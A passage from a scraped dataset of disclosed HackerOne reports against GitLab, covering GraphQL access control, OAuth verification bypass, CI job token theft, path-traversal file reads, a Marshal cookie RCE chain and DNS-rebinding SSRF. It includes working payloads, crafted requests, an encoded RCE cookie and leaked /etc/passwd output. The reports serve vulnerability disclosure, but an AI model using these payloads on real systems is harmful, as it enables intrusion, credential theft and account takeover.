--Hacker can steal victim's cookies etc.1 attachment:F595565: DOM_XSS.PNG",https://hackerone.com/reports/704266,California,United States,San Jose,2019,9,30,13,12
GitLab,1001-5000,0.0,200m-1b,"$1,370.00",Medium,5.45,Improper Access Control - Generic,A deactivated user can access data through GraphQL,"joaxcar  submitted a report to GitLab.May 11th (2 years ago)Summary
A deactivated user should not be able to access information through the API. This rule is not enforced when making requests through the GraphQL endpoint. 
When reading through the changelog for 13.11.2 i noticed that the rule for a deactivated user allows for :log_in (as it should) but it is restricted from :access_api(as it should) link. The GraphQL endpoint does not seam to use this rules when authorizing a user. I guess GraphQL only checks for api scope on the user.
This opens for three potential problems:

A user using its account through the GraphQL API (through some script or similar) would not get a warning that the account is deactivated. This could lead to the account being removed if the entities controlling the GitLab instance has any automatic procedures deleting accounts. When reading about the deactivation feature I got the impression that most admins requesting the feature would use it in automated ""cleanings"" of their user base. I could see how an admin could implement a ""deactivate after 90 days inactivity"" and ""delete after 180 days inactivity"" rule or similar. This could lead to an account being ""in use"" through GraphQL could get deleted without proper warnings.
An admin could use deactivated accounts as ""bots"" or ""service accounts"" bypassing the billing of these accounts. (an admin can create users and deactivate them directly, before ever using the account)
The fact that the account should not be able to do this. An admin reading the docs are under the assumption that a deactivated account is blocked from using the API. An inactive user could have left some form of scripts running that would keep on using resources on the GitLab instance, which I guess the admin would like to remediate by deactivating the account.

as of 13.10.4: A deactivated user can (without activating its account) use read queries on the GraphQL endpoint. The latest security patch removes the ability to use mutations due to the fact that 
Code 148 BytesWrap lines Copy Download1  rule { deactivated }.policy do
2   prevent :access_git
3   prevent :access_api
4   prevent :receive_notifications
5   prevent :use_slash_commands
6 end
prevents :access_api, and
Code 61 BytesWrap lines Copy Download1rule { ~can?(:access_api) }.prevent :execute_graphql_mutation
prevents from using mutations if I understand the code correctly.
tested on 13.11.1:  (Prior to latest security patch 13.11.2) A deactivated user can (without activating its account) use queries and mutations on the GraphQL endpoint.
Steps to reproduce
Unlimited service accounts

Login as admin
Create a user
Deactivate the user
Create an api token for the deactivated user
Use the token in GraphQL requests such as (replacing url and token)

Code 186 BytesWrap lines Copy Download1curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{""query"":""{\n  currentUser{id}\n}""}'d
User with deactivated account

Use any old token from your deactivated account in requests such as

Code 186 BytesWrap lines Copy Download1curl 'https://gitlab.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer <<TOKEN>>' --data '{""query"":""{\n  currentUser{id}\n}""}'d
or on servers prior to 13.11.2 (tested on 13.11.1)

Login as admin
Create a user
Deactivate the user
Create an api token for the deactivated user
Add the user to a project with (use admin token, and a real project id)

Code 141 BytesWrap lines Copy Download1curl --header ""Authorization: Bearer <<ADMIN TOKEN>>"" ""https://gitlab.domain.com/api/v4/projects//members"" --data ""user_id=2&access_level=40""

Then perform a mutation with the disabled account:

Code 315 BytesWrap lines Copy Download1curl 'https://gitlab.domain.com/api/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' -H 'Authorization: Bearer <<DEACTIVATEDTOKEN>>' --data '{""query"":""mutation {\n  labelCreate(input:{title:\""deactivated\"", projectPath:\""test1/test1\""}){\n    errors\n    label{\n      id\n    }\n  }\n}""}'
to create a label in the project.
Impact
For GitLab it could lead to loss of revenue due to the ability to create accounts that are not billabel but ""usable"". At the moment the GraphQL API is a bit limited but will probably grow in scope.
For users. Running the risk of missing warnings about disabled accounts. Could lead to deletion of account if admins does not notice that the account is being used.
Examples
I would guess that this is affecting GitLab.com but can not create a disabled account there.
What is the current bug behavior?
With a token from a disabled account the REST API gives:
Code 280 BytesWrap lines Copy Download1curl --header ""Authorization: Bearer jKSvxhuDN-Noag6N-w7R"" ""http://gitlab.joaxcar.com/api/v4/user""
2
3{""message"":""403 Forbidden - Your account has been deactivated by your administrator. Please log back in from a web browser to reactivate your account at http://gitlab.joaxcar.com""}
with GraphQL
Code 259 BytesWrap lines Copy Download1curl 'http://gitlab.joaxcar.com/api/graphql' -H 'Accept: application/json' -H 'Content-Type: application/json' -H 'Authorization: Bearer jKSvxhuDN-Noag6N-w7R' --data '{""query"":""{\n  currentUser{id}\n}""}'
2
3{""data"":{""currentUser"":{""id"":""gid://gitlab/User/15""}}}
What is the expected correct behavior?
GraphQL should give a warning as the REST API and block disabled users from accessing data.
Results of GitLab environment info
Code 1.84 KiBWrap lines Copy Download1System information
2System:		
3Current User:	gitlab
4Using RVM:	no
5Ruby Version:	3.0.1p64
6Gem Version:	/usr/lib/ruby/2.7.0/bundler/spec_set.rb:86:in `block in materialize': Could not find rake-13.0.3 in any of the sources (Bundler::GemNotFound)
7	from /usr/lib/ruby/2.7.0/bundler/spec_set.rb:80:in `map!'
8	from /usr/lib/ruby/2.7.0/bundler/spec_set.rb:80:in `materialize'
9	from /usr/lib/ruby/2.7.0/bundler/definition.rb:170:in `specs'
10	from /usr/lib/ruby/2.7.0/bundler/definition.rb:237:in `specs_for'
11	from /usr/lib/ruby/2.7.0/bundler/definition.rb:226:in `requested_specs'
12	from /usr/lib/ruby/2.7.0/bundler/runtime.rb:101:in `block in definition_method'
13	from /usr/lib/ruby/2.7.0/bundler/runtime.rb:20:in `setup'
14	from /usr/lib/ruby/2.7.0/bundler.rb:149:in `setup'
15	from /usr/lib/ruby/2.7.0/bundler/setup.rb:20:in `block in <top (required)>'
16	from /usr/lib/ruby/2.7.0/bundler/ui/shell.rb:136:in `with_level'
17	from /usr/lib/ruby/2.7.0/bundler/ui/shell.rb:88:in `silence'
18	from /usr/lib/ruby/2.7.0/bundler/setup.rb:20:in `<top (required)>'
19	from <internal:/usr/lib/ruby/3.0.0/rubygems/core_ext/kernel_require.rb>:85:in `require'
20	from <internal:/usr/lib/ruby/3.0.0/rubygems/core_ext/kernel_require.rb>:85:in `require'
21Bundler Version:unknown
22Rake Version:	13.0.3
23Redis Version:	6.2.3
24Git Version:	2.31.1
25Sidekiq Version:5.2.9
26Go Version:	go1.16.4 linux/amd64
27
28GitLab information
29Version:	13.10.4
30Revision:	e11cc45d59e
31Directory:	/usr/share/webapps/gitlab
32DB Adapter:	PostgreSQL
33DB Version:	13.2
34URL:		http://gitlab.joaxcar.com
35HTTP Clone URL:	http://gitlab.joaxcar.com/some-group/some-project.git
36SSH Clone URL:	gitlab@gitlab.joaxcar.com:some-group/some-project.git
37Using LDAP:	no
38Using Omniauth:	yes
39Omniauth Providers: 
40
41GitLab Shell
42Version:	13.17.0
43Repository storage paths:
44- default: 	/var/lib/gitlab/repositories
45GitLab Shell path:		/usr/share/webapps/gitlab-shell
46Git:		/usr/bin/git
Impact
A user with a disabled account can access the GraphQL API without activating the account. Running the risk of missing warnings about disabled accounts. Could lead to deletion of account if admins does not notice that the account is being used. Or accessing data without admins knowing the account is in use.
An admin could create accounts that are not billable but ""usable"". By creating disables accounts and use them through GraphQL.
I put it at medium due to the risk of data loss if not getting proper warnings and the fact that it has access to the API even if explicitly told that it should not in the documentation.  But feel free to lower the severity if you disagree.",https://hackerone.com/reports/1192460,California,United States,San Francisco,2021,5,11,19,38
GitLab,1001-5000,0.0,200m-1b,$200.00,Low,2.0,Violation of Secure Design Principles,A profile page of a user can be denied from loading by appending .html to the username,"maruthi12  submitted a report to GitLab.Jan 5th (4 years ago)Summary: I was able to create a user with the username ""dashboard.html"". Once, the account is set up, when the user clicks on his profile, the actual dashboard will show up instead of his profile page. Same can be done for all the HTML pages in GitLab.
Steps To Reproduce:

Register a new user with ""some_html_page_in_gitlab.html""
After logging in. click on the profile tab, it will be redirected to the dashboard page.
I even tried the username ""profile.html"", it is getting directed to the profile tab.

Impact
The major impact here I can think of is that a user can hide his profile from the public just by having a clowny username.",https://hackerone.com/reports/475098,California,United States,San Francisco,2019,1,5,17,12
GitLab,1001-5000,0.0,200m-1b,"$3,000.00",High,7.95,Authentication Bypass Using an Alternate Path or Channel,Ability to bypass email verification for OAuth grants results in accounts takeovers on 3rd parties,"cache-money  submitted a report to GitLab.Jul 13th (2 years ago)Summary
There's a limitation that requires a validated email before going through the OAuth flow, however this is bypassable. Bypassing this means the target site assumes your email is validated, and actually ends up signing you in with an non-validated email. This behavior can frequently lead to account takeovers in 3rd parties since they often use the email as an identifier, and fold all OAuth/manually created accounts into one. In my example I am going to demonstrate an account takeover on https://laravelshift.com/, however this concept is widely exploitable.
It should also be possible to use this technique to get into internal company using pages that just look for @domain.com in the email before allowing them access.
Steps to reproduce
1) Create a Bitbucket or GitHub account with a random email, and login to https://laravelshift.com/. (We're seeding a victim account).
2) In a different browser, create a new GitLab account with that same email but never confirm it.
3) In that browser, visit LaravelShift and click ""Sign in with GitLab"", notice you land on a page that states you cannot complete the OAuth grant without validating your email.
Run the following request in Burp replacing your cookies, CSRF token, and state parameter.
Code 414 BytesWrap lines Copy Download1POST /oauth/authorize HTTP/1.1
2Host: gitlab.com
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 354
5DNT: 1
6Connection: close
7Cookie: [COOKIES]
8
9utf8=%E2%9C%93&authenticity_token=[CSRF TOKEN]&client_id=6dd35c52b02a99eca3454505c4b1f1fa761ad1125bcdccdbc1c290877ef25093&redirect_uri=https%3A%2F%2Flaravelshift.com%2Fauth%2Fgitlab%2Fcallback&state=[STATE VALUE FROM URL]&response_type=code&scope=&nonce=
4) Notice the request succeeds with a 302 to LaravelShift with the code.
5) Visit that URL and notice you get logged into the victim's account from step 1. This works since the GitLab email is assumed to be trusted and validated.
Impact
Account takeovers on 3rd parties due to developers assuming GitLab is properly checking validated emails.
What is the current bug behavior?
It's possible to play the /oauth/authorize request directly to bypass the Verify the email address in your account profile before you sign in. prompt.
What is the expected correct behavior?
The email verification check should be enforced at this step of the process as well.
Impact
Thanks,
-- Tanner",https://hackerone.com/reports/922456,California,United States,San Francisco,2020,7,13,10,47
GitLab,1001-5000,0.0,200m-1b,"$3,000.00",High,7.5,Misconfiguration,Ability To Delete User(s) Account Without User Interaction,"hx01  submitted a report to GitLab.Jul 20th (2 years ago)Summary:
Gitlab allows its user to exercise their GDPR rights (Right to Access/Delete) user data by sending an email to gdpr-request@gitlab.com however gitlab team doesn't ask for security question(i.e Date Of Birth) before deleting the user account moreover doesn't authenticate the incoming emails from their  instance which allows an attacker to delete user accounts without user interaction :
██████
Steps to reproduce

Send an spoofed email from victim's email address to gdpr-request@gitlab.com from a reputable SMTP (e.g: Sendgrid):
███████
Victim will receive the following  confirmation email:

Image F914565: Screen_Shot_2020-07-21_at_2.18.53_AM.png 59.04 KiBZoom in Zoom out Copy Download
3. In the next few days victim's account will be deleted :
██████
Fix :

Add second verification i.e ask for DOB,Government ID.

Impact
Since Gitlab doesn't verify the request with an Valid ID before triggering Right to Access/Deletion this breaches the GDPR Law(Article 15) & moreover allows an attacker to delete User Accounts without user interaction.1 attachment:F914565: Screen_Shot_2020-07-21_at_2.18.53_AM.pngSummary by hx01Research Paper: https://hx01.me/Abusing_Data_Protection_Laws_For_D0xing_and_Account_Takeovers.pdf",https://hackerone.com/reports/928255,California,United States,San Francisco,2020,7,20,21,34
GitLab,1001-5000,0.0,200m-1b,"$12,000.00",Critical,9.6,Business Logic Errors,An attacker can run pipeline jobs as arbitrary user,"u3mur4  submitted a report to GitLab.Jun 9th (2 years ago)Summary
An attacker can run arbitrary pipeline jobs as a victim user. This means the attacker can access the user private repositories, member only repositories, registry, etc... by using the victim CI_JOB_TOKEN token.

This is only my recent research and I wanted to report it as soon as possible. I will update the report with more information later on.

Steps to reproduce
VICTIM:

Sign in to a GitLab instance as a Victim user
Create an arbitrary private repository with some private files. (We will steal this repo as a poc.)

ATTACKER ACCOUNT 1: 

Sign in to a GitLab instance as a Attacker1 user
Create a new project using the following settings:

Project Name: poc
Visibility Level : public
Check the Initialize repository with a README checkbox


Add a new .gitlab-ci.yml file to the project

Code 83 BytesWrap lines Copy Download1image: ""ruby:2.6""
2
3before_script:
4  - echo Hello
5
6rspec:
7  script:
8    - echo Hello

We will mirror this repository and update the .gitlab-ci.yml file later on to trigger the CI/CD job.

ATTACKER ACCOUNT 2: 

Sign in / Register to a GitLab instance as a Attacker2 user
Create a new public group called as test
Create a new project inside the test group using the following settings:

Project Name: poc
Visibility Level : public


Go to Project settings => Repository => Mirroring repositories

Set Git repository URL to the previously created repository by the Attacker1 user
Set Mirror direction to Pull
Check the Trigger pipelines for mirror updates checkbox
Click the Mirror repository button


Go to the test group Members option and invite the Victim user
Set the Victim user Choose a role permission to Owner
Go to the Account Setting => Account and delete this account.

ATTACKER ACCOUNT 1: 

Sign in back to the GitLab instance as a Attacker1 user
Go to the attacker1/poc project and update the .gitlab-ci.yml file using the following content:

Code 192 BytesWrap lines Copy Download1image: ""ruby:2.6""
2
3rspec:
4  script:
5    - git clone https://gitlab-ci-token:$CI_JOB_TOKEN@gitlab.com/victim/private_repo_name.git
6    - cd private_repo_name
7    - ls -lah .
8    - cat README.md

Wait half an hour to automatically trigger a mirror update in the test/poc project which owner is the Victim user.

The test/poc project will trigger a mirror update which also triggers a pipeline run. The triggerer of the pipeline will be the Victim user.
The Attacker1 user controls the attacker/poc/gitlab-ci.yml file which is mirrored to the test/poc project.
What is the current bug behavior?

If there is a mirrored project with Trigger pipelines for mirror updates enabled inside a group and the group owner delete its account (need another owner role inside the group) then the trigger of the pipeline will be to other owner account. (I think this only works when the account deleted without removing the account from the group members but I still need to confirm this.)

What is the expected correct behavior?

refuse pipeline run in the previously mentioned case

Output of checks
This bug happens on GitLab.com.
Results of GitLab environment info
Code 976 BytesWrap lines Copy Download1bundle exec rake gitlab:env:info RAILS_ENV=development
2System information
3System:		
4Proxy:		no
5Current User:	u3mur4
6Using RVM:	no
7Ruby Version:	2.6.6p146
8Gem Version:	3.0.3
9Bundler Version:1.17.3
10Rake Version:	12.3.3
11Redis Version:	6.0.4
12Git Version:	2.27.0
13Sidekiq Version:5.2.7
14Go Version:	go1.14.4 linux/amd64
15
16GitLab information
17Version:	13.1.0-pre
18Revision:	4bd9f8164e0
19Directory:	/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab
20DB Adapter:	PostgreSQL
21DB Version:	12.3
22URL:		http://gdk.yoyo.pw:3000
23HTTP Clone URL:	http://gdk.yoyo.pw:3000/some-group/some-project.git
24SSH Clone URL:	ssh://u3mur4@gdk.yoyo.pw:2222/some-group/some-project.git
25Elasticsearch:	no
26Geo:		no
27Using LDAP:	no
28Using Omniauth:	yes
29Omniauth Providers: google_oauth2
30
31GitLab Shell
32Version:	13.3.0
33Repository storage paths:
34- default: 	/home/u3mur4/Hack/gitlab/gitlab-development-kit/repositories
35GitLab Shell path:		/home/u3mur4/Hack/gitlab/gitlab-development-kit/gitlab-shell
36Git:		/usr/bin/git
Impact
stealing the CI_JOB_TOKEN of any user (access the user private repositories, member only repositories and registry, etc...)",https://hackerone.com/reports/894569,California,United States,San Francisco,2020,6,9,15,53
GitLab,1001-5000,0.0,200m-1b,"$16,000.00",Critical,9.5,Path Traversal,Arbitrary file read during project import,"saltyyolk  submitted a report to GitLab.Mar 22nd (2 years ago)
NOTE! Thanks for submitting a report! Please replace all the (parenthesized) sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!

Summary
A mis-usage of json schema validator could be used by an attacker to read any file in GitLab server. The issue allows the attacker to leak ~250 bytes of data of any file.
At the same time, as the root cause of the issue here is 'open-uri'. It's an SSRF issue at the same time.
Steps to reproduce

Use the import feature of gitlab.com to import the attached import.tar.gz as 'GitLab export' ███████
Wait the import process to finish
Access URL: https://gitlab.com/api/v4/projects/PROJECT_ID/import where PROJECT_ID is the id of the imported project, which could be found in the home page of the project.
The connection information of gitlab's production database is in the output, as attached.

Impact
For GitLab.com, this issue could be used to leak some critical credentials. I went through the charts in https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates. It seems that there're a bunch of  juicy credentials could be leaked with this method, including Rails secret_key_base, database credentials and GitLab's smtp credentials. The object storage service account credential is limitedly accessed because of the 250 bytes limitation.
For self-hosted GitLab instances, this issue could cause more severe problems since most of self-hosted GitLab instances has sidekiq running with gitlab-rails & gitlab-shell. So .gitlab_shell_token could be easily downloaded and be used to access internal APIs such as '/api/v4/internal/personal_access_token', which could issue an private access token of an admin of someone else.
Relevant logs and/or screenshots
███
███████
Output of checks
This bug happens on GitLab.com
Impact
For GitLab.com, this issue could be used to leak some critical credentials. I went through the charts in https://gitlab.com/gitlab-org/charts/gitlab/-/tree/master/charts/gitlab/charts/sidekiq/templates. It seems that there're a bunch of  juicy credentials could be leaked with this method, including Rails secret_key_base, database credentials and GitLab's smtp credentials. The object storage service account credential is limitedly accessed because of the 250 bytes limitation.
For self-hosted GitLab instances, this issue could cause more severe problems since most of self-hosted GitLab instances has sidekiq running with gitlab-rails & gitlab-shell. So .gitlab_shell_token could be easily downloaded and be used to access internal APIs such as '/api/v4/internal/personal_access_token', which could issue an private access token of an admin of someone else.",https://hackerone.com/reports/1132378,California,United States,San Francisco,2021,3,22,15,23
GitLab,1001-5000,0.0,200m-1b,"$1,000.00",Critical,9.5,Path Traversal,Arbitrary file read via the UploadsRewriter when moving and issue,"vakzz  submitted a report to GitLab.Mar 23rd (3 years ago)Summary
The UploadsRewriter does not validate the file name, allowing arbitrary files to be copied via directory traversal when moving an issue to a new project.
The pattern used to look for references is :
Code 91 BytesWrap lines Copy Download1  MARKDOWN_PATTERN = %r{\!?\[.*?\]\(/uploads/(?<secret>[0-9a-f]{32})/(?<file>.*?)\)}.freeze
This is used by the UploadsRewriter when copying an issue to also copy across the files:
Code 474 BytesWrap lines Copy Download1   @text.gsub(@pattern) do |markdown|
2          file = find_file(@source_project, $~[:secret], $~[:file])
3          break markdown unless file.try(:exists?)
4
5          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader
6          moved = klass.copy_to(file, target_parent)
7...
8   def find_file(project, secret, file)
9        uploader = FileUploader.new(project, secret: secret)
10        uploader.retrieve_from_store!(file)
11        uploader
12      end
As there is no restriction on what file can be, path traversal can be used to copy any file.
Demo
Video F757226: file-read.mp4 2.52 MiBZoom in Zoom out Copy Download
Steps to reproduce


Create two projects


Add an issue with the following description:
Code 100 BytesWrap lines Copy Download1![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)


Code 494 BytesWrap lines Copy Download11. Move the issue to  the second project
21. The file will have been copied to the project
3
4### Impact
5
6Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc
7
8### What is the current *bug* behavior?
9
10The file name and path are not checked when copying an issue between projects
11
12### What is the expected *correct* behavior?
13
14The file or path should be validated before copying files.
15
16### Output of checks
17#### Results of GitLab environment info
18
System information
System:		Ubuntu 18.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.6.5p114
Gem Version:	2.7.10
Bundler Version:1.17.3
Rake Version:	12.3.3
Redis Version:	5.0.7
Git Version:	2.24.1
Sidekiq Version:5.2.7
Go Version:	unknown
GitLab information
Version:	12.8.7-ee
Revision:	2643fd87200
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	10.12
URL:		http://gitlab-vm.local
HTTP Clone URL:	http://gitlab-vm.local/some-group/some-project.git
SSH Clone URL:	git@gitlab-vm.local:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:
GitLab Shell
Version:	11.0.0
Repository storage paths:

default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
Git:		/opt/gitlab/embedded/bin/git

Code 114 BytesWrap lines Copy Download1
2## Impact
3
4Allows an attacker to read arbitrary files on the server, including tokens, private data, configs, etc1 attachment:F757226: file-read.mp4
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Mar 23rd (3 years ago)Affects gitlab.com as well, example of a moved issues that copies /etc/passwd at https://gitlab.com/vakzz-h1-group-1/dest/-/issues/2
Code 353 BytesWrap lines Copy Download1gitlab-monitor:x:997:997::/opt/gitlab-monitor:/bin/false
2postgres:x:116:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
3influxdb-relay:x:996:996::/var/lib/influxdb-relay:/bin/false
4gitlab-www:x:503:503::/var/opt/gitlab/nginx:/bin/false
5gitlab-redis:x:502:502::/var/opt/gitlab/redis:/bin/false
6iwiedler:x:1030:1030::/home/iwiedler:/bin/bash Bot: gitlab-securitybot   posted a comment. Mar 23rd (3 years ago)Hi @vakzz,
Thank you for submitting this report. We will investigate the issue as soon as possible.
Due to our current workload, we will get back within 10 business days with an update.
Please refrain from submitting your report or inquiring about its status through
additional channels, as this unnecessarily binds resources in the security team.
Best regards,
GitLab Security Teamdcouture GitLab staff  changed the status to Triaged. Mar 23rd (3 years ago)Hello @vakzz,
Thank you for submitting this report.
We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at https://gitlab.com/gitlab-org/gitlab/-/issues/212175.  This issue will be made public 30 days following the release of a patch.
Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!
We will continue to update you via HackerOne as a patch is scheduled for release.
Best regards,
Dominic
Security Team | GitLab Inc.GitLab  rewarded vakzz with a $1,000 bounty. Mar 23rd (3 years ago)Initial $1000 on triage Bot: gitlab-securitybot   posted a comment. Mar 24th (3 years ago)ETA for fix:
Hi @vakzz,
The issue you reported is currently scheduled to be fixed by 2020-04-30.
Thank you again for contacting us!
Best regards,
GitLab Security Team
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Mar 24th (3 years ago)Thanks for the triage payment and for the updates!
It's possible to turn this into an RCE as the cookies_serializer is set to :hybrid by default.
The can be done by first grabbing the secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml using the arbitrary file read and then use the experimentation_subject_id cookie with a Marshalled payload.
A payload can be generated by changing your own gitlab instances secret_key_base to match, then running the following in a rails console
Code 398 BytesWrap lines Copy Download1request = ActionDispatch::Request.new(Rails.application.env_config)
2request.env[""action_dispatch.cookies_serializer""] = :marshal
3cookies = request.cookie_jar
4
5erb = ERB.new(""<%= `echo vakzz was here > /tmp/vakzz` %>"")
6depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, ""@result"", ActiveSupport::Deprecation.new)
7cookies.signed[:cookie] = depr
8puts cookies[:cookie]
Then send this cookie to the server:
Code 607 BytesWrap lines Copy Download1curl -vvv 'http://gitlab-vm.local/users/sign_in' -b ""experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiYiNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIHZha3p6IHdhcyBoZXJlID4gL3RtcC92YWt6emAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OhBAZGVwcmVjYXRvckl1Oh9BY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbgAGOwpUOglAdmFySSIMQHJlc3VsdAY7ClQ=--ef9c244a1f6b4724c1d3cbf045f8ee28a42d4b06""
And it will be executed:
Code 31 BytesWrap lines Copy Download1$ cat /tmp/vakzz
2vakzz was here
Cheers,
WillGitLab  rewarded vakzz with a $19,000 bounty. Mar 27th (3 years ago)Hi @vakzz,
Thank you again for the report! Your finding has been patched in GitLab version 12.9.1 and we are awarding a bounty. Congratulations!
Please let us know if you find that our patch does not mitigate your finding. Your report will be published in 30 days in GitLab's issue tracker.
We look forward to your next report!
Best regards,
Dominic
Security Team | GitLab Inc.dcouture GitLab staff  closed the report and changed the status to Resolved. Mar 27th (3 years ago)
    
    
        
            
                
                
                
            
        
    
vakzz   posted a comment. Apr 17th (3 years ago)Hi @dcouture,
Is it possible to get a self-hosted Ultimate license (my trial will expire soon)? Here are the links to some other reposts as requested in https://hackerone.com/gitlab#gitlab-ultimate-license
https://hackerone.com/reports/653125
https://hackerone.com/reports/658013
https://hackerone.com/reports/826361
Cheers,
Willdcouture GitLab staff  posted a comment. Apr 17th (3 years ago)Hello @vakzz,
Thank you for requesting a license. We have validated your reports, and the license has been sent to your vakzz@wearehackerone.com email address. Please let us know if it has not been received in the next 24 hours, and we can resend it to you.
Thank you again for your interest in our program. We look forward to your future reports!
Best Regards,
Dominic
GitLab Security Teamdcouture GitLab staff  requested to disclose this report. Apr 27th (3 years ago)vakzz   agreed to disclose this report. Apr 27th (3 years ago)  This report has been disclosed. Apr 27th (3 years ago)",https://hackerone.com/reports/827052,California,United States,San Francisco,2020,3,23,10,54
GitLab,1001-5000,0.0,200m-1b,"$5,000.00",High,7.6,Server-Side Request Forgery (SSRF),GitLab::UrlBlocker validation bypass leading to full Server Side Request Forgery,"ajxchapman  submitted a report to GitLab.Apr 17th (4 years ago)Summary
The GitLab::UrlBlocker IP address validation methods suffer from a Time of Check to Time of Use (ToCToU) vulnerability. The vulnerability occurs due to multiple DNS resolution requests performed before and after the checks. This issue allows a malicious authenticated user to send GET and POST HTTP requests to arbitrary hosts, including the localhost, cloud metadata services and the local network, and read the HTTP response.
Details
The IP address validation code in /lib/gitlab/url_blocker.rb resolves the IP addresses of the provided URL domain, raises an exception if the resolved IP addresses match addresses in block lists (127.0.0.1, ::1, 169.254.0.0/16, etc.) or returns true if the IP address do not match the block lists.
Code 450 BytesWrap lines Copy Download1  begin
2    addrs_info = Addrinfo.getaddrinfo(uri.hostname, port, nil, :STREAM).map do |addr|
3      addr.ipv6_v4mapped? ? addr.ipv6_to_ipv4 : addr
4    end
5  rescue SocketError
6    return true
7  end
8
9  validate_localhost!(addrs_info) unless allow_localhost
10  validate_loopback!(addrs_info) unless allow_localhost
11  validate_local_network!(addrs_info) unless allow_local_network
12  validate_link_local!(addrs_info) unless allow_local_network
13
14  true
15end
If the address validates the GitLab::HTTP code then uses HTTParty to request the URL, which performs a second URL domain DNS resolution. The address validation checks can be bypassed if the URL domain resolves to a valid address for the first resolution then a forbidden address after the checks are performed. 
In order to perform this attack a DNS server must be configured to resolve a domain to alternating addresses with a low (or zero) Time To Live. To demonstrate this issue I used my researchersservers project (https://github.com/ajxchapman/sshreverseshell) with the configuration in 41_gitlab.json (F470655). Output of resolving gitlabextssrf.webhooks.pw against this DNS resolver configuration is shown below:
Code 542 BytesWrap lines Copy Download1$ dig +noall +answer gitlabextssrf.webhooks.pw
2gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
3$ dig +noall +answer gitlabextssrf.webhooks.pw
4gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
5$ dig +noall +answer gitlabextssrf.webhooks.pw
6gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
7$ dig +noall +answer gitlabextssrf.webhooks.pw
8gitlabextssrf.webhooks.pw. 0    IN      A       127.0.0.1
9$ dig +noall +answer gitlabextssrf.webhooks.pw
10gitlabextssrf.webhooks.pw. 0    IN      A       198.211.125.160
Notice the alternating resolved IP address and 0 ttl.
Attack scenario
Using the Web Hook integration functionality of a GitLab repository, this issue can be abused to send HTTP GET and POST requests to arbitrary IP addresses, with arbitrary path parameters. The following screenshot shows the response of an HTTP GET request to http://169.254.169.254/metadata/v1.json on a DigitalOcean droplet:
Image F470641: Screenshot_from_2019-04-17_09-18-49.png 66.91 KiBZoom in Zoom out Copy Download
Steps to reproduce
To demonstrate this issue I have configured the domain gitladextssrf.webhooks.pw to randomly resolve to either 198.211.125.160 or 127.0.0.1.

Create a new repository
Add a commit to the repository
Create a new Web Hook integration with the URL http://gitlabextssrf.webhooks.pw:9999.


This may take several attempts due to the random nature of the gitlabextssrf.webhooks.pw DNS resolver, if it fails with a 500 error, try again until it is accepted.


Log into the gitlab server and start a TCP listener on port 9999/tcp (e.g. nc -vvn -l -p 9999)
Perform numerous parallel requests to the Web Hook test endpoint. For this I use wfuzz

Code 213 BytesWrap lines Copy Download1$ ./wfuzz -X POST \
2  -b ""_gitlab_session=<session_id>;"" \
3  -d ""_method=post&authenticity_token=<token>"" \
4  -z range,0-1000 \
5  ""https://<domain>/<user>/<repo>/hooks/<hook_id>/test?trigger=push_events&test=FUZZ""
The the below video demonstration of reproducing this issue:
Video F470642: gitlab_ssrf.mp4 3.47 MiBZoom in Zoom out Copy Download
After several requests a connection will be made to the local TCP listener on port 9999/tcp.
Impact
This issue allows a malicious authenticated user to send GET and POST HTTP requests from the GitLab server to arbitrary hosts (including the localhost, cloud metadata services and the local network) with arbitrary paths, and read the HTTP response. This could be abused to compromise the host (e.g. leaking AWS tokens from the metadata service), or perform reconnaissance and exploitation of hosts on the local network.
What is the current bug behavior?
The GitLab::UrlBlocker validation code resolves the IP addresses of a URL domain, validates them against a series of block lists, and if valid returns to the GitLab::HTTP module which re-resolves the URL domain in order to perform the HTTP request.
What is the expected correct behavior?
The validated resolved addresses should be returned by GitLab::UrlBlocker and used by GitLab::HTTP to make the TCP connection to the destination host.
Relevant logs and/or screenshots
Output of using the ToCToU bypass in a Web Hook to send a request to the DigitalOcean droplet meta data API http://169.254.169.254/metadata/v1.json endpoint:
Image F470641: Screenshot_from_2019-04-17_09-18-49.png 66.91 KiBZoom in Zoom out Copy Download
Output of checks
Results of GitLab environment info
Code 1.00 KiBWrap lines Copy Download1$ gitlab-rake gitlab:env:info
2
